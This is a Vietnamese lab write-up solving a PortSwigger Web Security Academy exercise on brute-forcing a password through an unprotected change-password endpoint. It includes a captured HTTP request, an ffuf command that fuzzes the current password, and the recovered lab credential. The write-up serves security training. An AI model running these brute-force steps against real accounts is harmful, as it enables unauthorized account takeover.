![[auth-pass-change-brute.png]]
-mô tả lab: chỗ `/login` thì block gắt, nhưng chỗ `/my-account/change-password` thì không block gì cả. Mình sẽ brute ở đó.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change

### hướng giải
- [ ] mình login bằng account của mình `test:test`, mình vào `/my-account/change-password`
- [ ] sau khi quan sát gói tin này, mình thấy body là `username=test&current-password=test&new-password-1=...&new-password-2=...`
- [ ] mình thử đổi `username=test` thành `username=carlos` + `current-password` bừa, mình thấy nó báo `Current password is incorrect`, khác với khi mình nhập username không tồn tại
- [ ] => nên mình hiểu là: endpoint này cũng bị username enumeration, mà lại không bị rate-limit. Nên mình brute password của `carlos` ở đây luôn cho khỏe

### giải
-bước 1: mình bắt request change-password của mình, lưu thành `changepass.txt`:
```
POST /my-account/change-password HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_CUA_MINH_CUA_TEST
Content-Type: application/x-www-form-urlencoded

username=carlos&current-password=PASS&new-password-1=test123&new-password-2=test123
```
-mình giữ `username=carlos` cố định, chỉ fuzz `current-password`.

-bước 2: mình chạy ffuf:
```bash
ffuf -request changepass.txt -request-proto https -w passwords.txt:PASS -fr "Current password is incorrect" -mc 200
```
-sau khi quan sát kết quả này, mình thấy tất cả đều báo `Current password is incorrect`, chỉ có 1 response khác (báo `Password changed` hoặc length khác). Đó là password đúng.
![[auth-pass-change-ffuf.png]]

-kết quả là `carlos:montoya`.

-bước 3: mình login `carlos:montoya` là solve. Không cần thèm đụng vào `/login` bị block.

> [!NOTE]
> -bài học của mình: chỗ nào check password thì chỗ đó phải có rate-limit như nhau. Bỏ sót 1 endpoint là toang.
